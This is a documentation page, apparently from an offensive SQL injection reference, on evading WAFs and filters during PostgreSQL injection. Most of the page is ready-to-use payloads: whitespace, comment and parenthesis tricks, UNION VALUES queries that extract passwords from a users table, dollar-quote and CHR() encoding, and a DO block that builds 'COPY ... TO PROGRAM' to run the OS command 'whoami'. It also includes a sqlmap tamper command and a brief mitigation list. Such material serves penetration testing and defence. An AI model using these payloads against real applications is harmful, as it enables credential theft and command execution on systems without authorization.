---
title: Fuzzing and Obfuscation
description: Techniques for bypassing WAFs and filters in PostgreSQL injection
category: Advanced Techniques
order: 20
tags: ["bypass", "WAF", "obfuscation", "filter evasion"]
lastUpdated: 2025-12-15
---

## Fuzzing and Obfuscation

Modern web applications often employ Web Application Firewalls (WAFs) and other security measures to detect and block SQL injection attempts. Fuzzing and obfuscation techniques can help bypass these protections by disguising SQL injection payloads.

All techniques tested on PostgreSQL 12.x and 16.x unless noted otherwise.

### Comment Variations

PostgreSQL supports multiple comment styles:

```sql
-- Standard SQL line comment (double dash)
SELECT * FROM users -- comment

-- C-style block comment
SELECT * FROM users /* comment */

-- Inline comments for obfuscation (replace spaces)
SELECT/**/username/**/FROM/**/users

-- Nested comments (PostgreSQL-specific)
SELECT /* outer /* nested */ comment */ username FROM users
```

**Note:** Unlike MySQL, PostgreSQL does **NOT** support splitting keywords with comments:

```sql
-- DOES NOT WORK in PostgreSQL
SEL/**/ECT username FR/**/OM users  -- Syntax error!
```

### Whitespace Alternatives

PostgreSQL accepts only **5 characters** as whitespace (tested across Unicode range 0x0000-0xFFFF):

| Hex  | Dec | Character       | URL Encoded |
| ---- | --- | --------------- | ----------- |
| 0x09 | 9   | Horizontal Tab  | %09         |
| 0x0A | 10  | Line Feed (LF)  | %0A         |
| 0x0C | 12  | Form Feed       | %0C         |
| 0x0D | 13  | Carriage Return | %0D         |
| 0x20 | 32  | Space           | %20         |

**Note:** Vertical tab (0x0B) is NOT valid whitespace in PostgreSQL—it causes syntax errors.

```sql
-- Tab and newline as separators
SELECT%09username%0AFROM%0Dusers

-- Between UNION and SELECT
0 UNION%09SELECT 1,2,3,4--
0 UNION%0ASELECT 1,2,3,4--
```

### Characters That Don't Require Space After SELECT

Certain characters can immediately follow `SELECT` without whitespace:

| Works | Pattern     | Example        | Why                         |
| ----- | ----------- | -------------- | --------------------------- |
| ✓     | `'` (quote) | `SELECT'test'` | Quote starts string literal |
| ✓     | `.` (dot)   | `SELECT.1e1`   | Dot starts decimal number   |
| ✓     | `-` (minus) | `SELECT-1`     | Unary minus operator        |
| ✓     | `+` (plus)  | `SELECT+1`     | Unary plus operator         |
| ✓     | `@` (at)    | `SELECT@(-5)`  | Absolute value operator     |
| ✓     | `(` (paren) | `SELECT(1)`    | Parentheses grouping        |

```sql
-- No space needed after SELECT
SELECT'test'
SELECT.1e1
SELECT-1
SELECT+1
SELECT(username)FROM users

-- Combined with UNION
0 UNION(SELECT'test','x','x','x')--
0 UNION(SELECT+1,'test','x','x')--
```

### Parentheses as Space Alternative

Parentheses eliminate the need for whitespace in many contexts:

```sql
-- No spaces needed
UNION(SELECT 1,2,3,4)
UNION((SELECT 1,2,3,4))
UNION ALL(SELECT 1,2,3,4)
SELECT(username)FROM(users)WHERE(id=1)

-- Nested subquery hides UNION SELECT pattern
0 UNION(SELECT * FROM(SELECT 1,$$test$$,$$x$$,$$x$$)t)--
```

### VALUES Clause (Avoids SELECT Keyword!)

The `VALUES` clause completely bypasses `UNION SELECT` pattern matching:

```sql
-- Basic VALUES (no SELECT keyword after UNION!)
0 UNION VALUES(1,$$test$$,$$email$$,$$role$$)--

-- VALUES with multiple rows
0 UNION VALUES(1,$$a$$,$$b$$,$$c$$),(2,$$d$$,$$e$$,$$f$$)--

-- VALUES with alternative whitespace
0 UNION%09VALUES(1,$$test$$,$$x$$,$$x$$)--

-- VALUES with subqueries (extract real data!)
0 UNION VALUES(999,(SELECT password FROM users LIMIT 1),$$x$$,$$x$$)--
0 UNION VALUES((SELECT id FROM users LIMIT 1),(SELECT username FROM users LIMIT 1),$$x$$,$$x$$)--
```

### Dollar Quote Obfuscation

PostgreSQL's dollar quoting bypasses single quote filters:

```sql
-- Basic dollar quotes
SELECT * FROM users WHERE username = $$admin$$

-- Tagged dollar quotes
SELECT * FROM users WHERE username = $x$admin$x$

-- Unicode tags (WAFs often don't expect these)
SELECT * FROM users WHERE username = $α$admin$α$
SELECT * FROM users WHERE username = $日$admin$日$
SELECT * FROM users WHERE username = $💀$admin$💀$

-- UNION with unicode tags
0 UNION SELECT 1,$α$test$α$,$β$email$β$,$γ$role$γ$--
```

**Tag Rules** (tags follow unquoted identifier rules):

- Official docs: tags can contain letters (including non-Latin), digits, and underscores
- In practice: PostgreSQL's scanner accepts any UTF-8 multi-byte character (bytes 128-255), which includes emojis (💀, ☠) and all non-ASCII Unicode
- ASCII punctuation (@, #, !, etc.) is **not valid** - only bytes 0-127 that are letters/digits/underscore
- Tags **cannot** start with a digit (`$1tag$` fails)
- Tags **cannot** contain dollar signs (the `$` delimiters are separate)
- Tags are case-sensitive (`$Tag$` ≠ `$tag$`)
- Empty tags are valid (`$$` with no tag name)

### String Representation Alternatives

Multiple ways to represent strings without standard quotes:

```sql
-- CHR() function (builds string from ASCII codes)
SELECT CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)  -- 'admin'
1 OR username=(CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110))--

-- Escape string syntax
SELECT E'\x61\x64\x6d\x69\x6e'  -- Hex
SELECT E'\141\144\155\151\156'  -- Octal

-- Unicode escape
SELECT U&'\0061\0064\006D\0069\006E'

-- Custom UESCAPE (bypasses backslash filters)
SELECT U&'!0061dmin' UESCAPE '!'

-- Convert from hex
SELECT convert_from('\x61646d696e', 'UTF8')
```

### Numeric Representation

Bypass filters that match specific integers:

```sql
-- Scientific notation
?id=1e0
?id=0.1e1

-- Mathematical expressions
?id=2-1
?id=ABS(-1)
?id=LENGTH('x')
?id=ASCII('1')-48

-- Boolean conversion
?id=true::int

-- Cast from string
?id='1'::int

-- For UNION injections
0e0 UNION SELECT 1,2,3,4--
```

### Type Casting for Bypass

```sql
-- Multiple type name variations
?id='1'::int
?id='1'::integer
?id='1'::int4
?id=CAST('1' AS int)

-- Type constructor functions
?id=int4('1')

-- Array syntax
?id=ANY(ARRAY[1])
?id=ANY('{1}'::int[])
```

### Boolean Representation Bypasses

Many representations of TRUE/FALSE for bypassing `1=1` filters:

```sql
-- Instead of OR 1=1
1 OR true--
1 OR 'yes'::boolean--
1 OR 'on'::boolean--
1 OR 1::boolean--
1 OR NOT false--
1 OR BOOL 't'--

-- TRUE representations
true, 't'::boolean, 'yes'::boolean, 'on'::boolean, 1::boolean

-- FALSE representations
false, 'f'::boolean, 'no'::boolean, 'off'::boolean, 0::boolean
```

### PostgreSQL-Specific Operators

#### Array Operators

```sql
SELECT * FROM users WHERE ARRAY[id] @> ARRAY[1]
SELECT * FROM users WHERE id = ANY('{1,2,3}'::int[])
SELECT * FROM users WHERE id = (ARRAY[1,2,3])[1]
```

#### Pattern Matching Alternatives

```sql
-- Instead of LIKE
1 OR username ~ $$^admin$$--           -- regex
1 OR username ~* $$^ADMIN$$--          -- regex case-insensitive
1 OR username ^@ $$adm$$--             -- starts-with (PG11+)
1 OR STRPOS(username, $$admin$$) > 0--
```

#### Schema-Qualified Functions

Prefix with `pg_catalog.` to bypass function name filters:

```sql
1 OR pg_catalog.length(username) > 0--
1 OR pg_catalog.upper(username) = $$ADMIN$$--
```

### DO $$ Block WAF Bypass

Execute dynamic SQL with CHR() encoding to bypass keyword filters:

```sql
-- Basic DO block
DO $$ BEGIN RAISE NOTICE 'Hello'; END $$;

-- Build commands with CHR()
DO $$
DECLARE cmd TEXT;
BEGIN
    cmd := CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84);  -- SELECT
    cmd := cmd || ' * FROM users';
    EXECUTE cmd;
END $$;

-- Bypass COPY keyword filter
DO $x$
DECLARE
    c TEXT := CHR(67)||CHR(79)||CHR(80)||CHR(89);  -- COPY
    p TEXT := CHR(80)||CHR(82)||CHR(79)||CHR(71)||CHR(82)||CHR(65)||CHR(77);  -- PROGRAM
BEGIN
    EXECUTE c || ' (SELECT 1) TO ' || p || ' ''whoami''';
END $x$;
```

**Note:** `COPY ... TO PROGRAM` requires superuser privileges or membership in `pg_execute_server_program` (PostgreSQL 11+). This technique only works on misconfigured instances or when the database connection already has elevated privileges — standard application database users cannot execute it.

**Helper to convert string to CHR():**

```sql
SELECT string_agg('CHR(' || ascii(ch) || ')', '||')
FROM regexp_split_to_table('SELECT', '') AS ch;
-- Returns: CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84)
```

### Complete Bypass Examples

```sql
-- No space after UNION, no SELECT keyword
0 UNION%09VALUES(999,(SELECT password FROM users LIMIT 1),$$x$$,$$x$$)--

-- Parentheses eliminate all spaces
0 UNION(SELECT(username)FROM(users))--

-- Unicode tags + block comments
0/**/UNION/**/SELECT/**/1,$α$test$α$,$β$email$β$,$γ$role$γ$--

-- Maximum obfuscation
0%09UNION%09VALUES(999,(SELECT%09password%09FROM%09users%09LIMIT%091),$α$x$α$,$β$x$β$)--

-- Scientific notation + boolean
1e0 OR 'yes'::boolean--

-- CHR() encoded comparison
1 OR username=(CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110))--
```

### Automated Testing

```bash
# SQLMap with tamper scripts
sqlmap -u "http://target/page?id=1" --tamper=space2comment,charencode

# Common PostgreSQL tamper scripts:
# - space2comment: Replace spaces with /**/
# - charencode: URL encode characters
# - between: Replace > with BETWEEN
# - randomcase: Randomize keyword case
```

### Mitigation

1. Use parameterized queries (prepared statements)
2. Implement input validation with whitelist approach
3. Use WAF with regularly updated signatures
4. Limit database user privileges
5. Monitor and log suspicious query patterns
